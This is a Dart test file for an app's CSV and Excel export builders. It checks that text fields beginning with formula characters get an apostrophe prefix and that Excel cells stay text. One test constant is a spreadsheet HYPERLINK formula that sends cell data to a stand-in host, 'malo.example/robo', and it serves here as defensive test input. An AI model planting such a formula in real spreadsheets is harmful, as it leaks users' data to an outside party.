import 'dart:convert';

import 'package:app_gestion/core/utils/money.dart';
import 'package:app_gestion/features/exports/data/services/builders/cierre_caja_export_builder.dart';
import 'package:app_gestion/features/exports/data/services/builders/compras_export_builder.dart';
import 'package:app_gestion/features/exports/data/services/builders/empleados_export_builder.dart';
import 'package:app_gestion/features/exports/data/services/builders/inventario_export_builder.dart';
import 'package:app_gestion/features/exports/data/services/builders/ventas_export_builder.dart';
import 'package:app_gestion/features/exports/data/services/celda_segura.dart';
import 'package:app_gestion/features/exports/domain/entities/export_models.dart';
import 'package:csv/csv.dart';
import 'package:excel/excel.dart' as xls;
import 'package:flutter_test/flutter_test.dart';

const _formula = '=HYPERLINK("http://malo.example/robo?d="&A1,"Clic aquí")';

/// Filas del CSV (sin el BOM UTF-8 del inicio).
List<List<dynamic>> _leerCsv(List<int> bytes) {
  final texto = utf8.decode(bytes.sublist(3));
  return const CsvToListConverter(
    shouldParseNumbers: false,
    eol: '\r\n',
  ).convert(texto);
}

void main() {
  group('celdaSegura (función pura)', () {
    test(
      'antepone apóstrofo a los textos que empiezan por = + - @ tab o CR',
      () {
        for (final inicio in ['=', '+', '-', '@', '\t', '\r']) {
          expect(celdaSegura('${inicio}cmd'), "'${inicio}cmd", reason: inicio);
        }
      },
    );

    test('el texto normal queda intacto', () {
      for (final texto in [
        'Arroz selecto',
        'Refresco 2 L',
        'Pan de agua = 5',
        'a+b',
        'x-y',
        'correo@dominio.com',
        ' =espacio primero',
        '',
        "'ya lleva apóstrofo",
        'ñandú',
      ]) {
        expect(celdaSegura(texto), texto, reason: texto);
      }
    });

    test('un texto que ya empieza por apóstrofo no se duplica', () {
      expect(celdaSegura("'=1+1"), "'=1+1");
    });

    test('solo mira el PRIMER carácter', () {
      expect(celdaSegura('ok=fine'), 'ok=fine');
      expect(celdaSegura('=1+1'), "'=1+1");
    });
  });

  group('csvSeguro', () {
    test('protege los textos libres y deja intactos números y montos', () {
      final csv = csvSeguro([
        ['Producto', 'Cantidad', 'Monto'],
        [libre('=cmd()'), -3, '-50.00'],
        [libre('Arroz'), 2.5, '1,250.00'],
        [libre(null), 0, '-0.50'],
      ]);

      final filas = const CsvToListConverter(
        shouldParseNumbers: false,
        eol: '\r\n',
      ).convert(csv);

      expect(filas[1], ["'=cmd()", '-3', '-50.00']);
      expect(filas[2], ['Arroz', '2.5', '1,250.00']);
      expect(filas[3], ['', '0', '-0.50']);
    });

    test('un monto negativo NO se marca con apóstrofo', () {
      final csv = csvSeguro([
        ['-50.00', -50, -1.5],
      ]);
      expect(csv, contains('-50.00'));
      expect(csv, isNot(contains("'-")));
    });
  });

  group('CSV de los reportes', () {
    final fecha = DateTime.utc(2026, 1, 15, 12);

    test('ventas: producto y usuario con fórmula se neutralizan; el monto '
        'negativo sigue siendo número', () {
      final bytes = VentasExportBuilder.csv([
        VentaExportRow(
          id: 'v1',
          fecha: fecha,
          tipo: 'rapida',
          usuario: '@usuario',
          estado: 'completada',
          total: const Money(-5000),
          ganancia: const Money(-1000),
          items: const [
            VentaItemExportRow(
              producto: _formula,
              cantidad: 2,
              precioUnitario: Money(2500),
              costoUnitario: Money(1500),
            ),
          ],
        ),
      ]);

      final filas = _leerCsv(bytes);

      final fila = filas[1];
      expect(fila[3], "'@usuario");
      expect(fila[5], "'$_formula");
      expect(fila[10], '-50.00'); // total (monto negativo intacto)
      expect(fila[11], '-10.00'); // ganancia
    });

    test('compras: proveedor, factura y producto', () {
      final bytes = ComprasExportBuilder.csv([
        CompraExportRow(
          id: 'c1',
          fecha: fecha,
          proveedor: '+proveedor',
          numeroFactura: '=F-1',
          usuario: '-admin',
          estado: 'completada',
          total: const Money(1000),
          items: const [
            CompraItemExportRow(
              producto: '@producto',
              cantidad: 1,
              costoUnitario: Money(1000),
            ),
          ],
        ),
      ]);

      final fila = _leerCsv(bytes)[1];

      expect(fila[2], "'+proveedor");
      expect(fila[3], "'=F-1");
      expect(fila[4], "'-admin");
      expect(fila[6], "'@producto");
    });

    test('empleados: nombre, cédula y período', () {
      final bytes = EmpleadosExportBuilder.csv([
        EmpleadoExportRow(
          nombre: '=Juan',
          tipo: 'ventas',
          cedula: '+809',
          fechaIngreso: fecha,
          activo: true,
          totalPagado: const Money(-100),
          pagos: [
            PagoExportRow(
              fecha: fecha,
              monto: const Money(-100),
              periodo: '@enero',
            ),
          ],
        ),
      ]);

      final fila = _leerCsv(bytes)[1];

      expect(fila[0], "'=Juan");
      expect(fila[2], "'+809");
      expect(fila[8], "'@enero");
      expect(fila[5], '-1.00'); // total pagado: monto, no texto
    });

    test('inventario: nombre, categoría y unidad', () {
      final bytes = InventarioExportBuilder.csv([
        const InventarioExportRow(
          nombre: _formula,
          categoria: '-Granos',
          unidad: '@lb',
          stockActual: -2,
          precioCompra: Money(100),
          precioVenta: Money(150),
          valorCosto: Money(-200),
          valorVenta: Money(-300),
        ),
      ]);

      final fila = _leerCsv(bytes)[1];

      expect(fila[0], "'$_formula");
      expect(fila[1], "'-Granos");
      expect(fila[2], "'@lb");
      expect(fila[3], '-2.0'); // stock negativo: número
      expect(fila[6], '-2.00'); // valor a costo: monto
    });

    test('cierre de caja: usuarios y motivo del movimiento', () {
      final bytes = CierreCajaExportBuilder.csv(
        CierreCajaExportRow(
          fechaApertura: fecha,
          fechaCierre: fecha,
          usuarioApertura: '=admin',
          usuarioCierre: '+cajero',
          montoApertura: const Money(0),
          montoEsperado: const Money(0),
          montoContado: const Money(0),
          diferencia: const Money(-50),
          montoDejadoSiguiente: const Money(0),
          movimientos: [
            MovimientoCajaExportRow(
              tipo: 'salidaManual',
              monto: const Money(-3000),
              fecha: fecha,
              motivo: '-Delivery',
            ),
          ],
        ),
      );

      final texto = utf8.decode(bytes.sublist(3));

      expect(texto, contains("Usuario apertura,'=admin"));
      expect(texto, contains("Usuario cierre,'+cajero"));
      expect(texto, contains("'-Delivery"));
      expect(texto, contains('Diferencia,-0.50'));
      expect(texto, contains('-30.00')); // monto del movimiento, intacto
    });
  });

  group('Excel: el texto NO se evalúa como fórmula', () {
    test('un producto con "=..." se guarda como TextCellValue, no como '
        'FormulaCellValue', () {
      final bytes = VentasExportBuilder.excel([
        VentaExportRow(
          id: 'v1',
          fecha: DateTime.utc(2026, 1, 15),
          tipo: 'rapida',
          usuario: 'Ana',
          estado: 'completada',
          total: const Money(100),
          ganancia: const Money(10),
          items: const [
            VentaItemExportRow(
              producto: _formula,
              cantidad: 1,
              precioUnitario: Money(100),
              costoUnitario: Money(50),
            ),
          ],
        ),
      ]);

      final libro = xls.Excel.decodeBytes(bytes);
      final celda = libro['Ventas'].rows[1][5]!;

      expect(celda.value, isA<xls.TextCellValue>());
      expect(celda.value, isNot(isA<xls.FormulaCellValue>()));
      expect((celda.value as xls.TextCellValue).value.toString(), _formula);
    });
  });
}
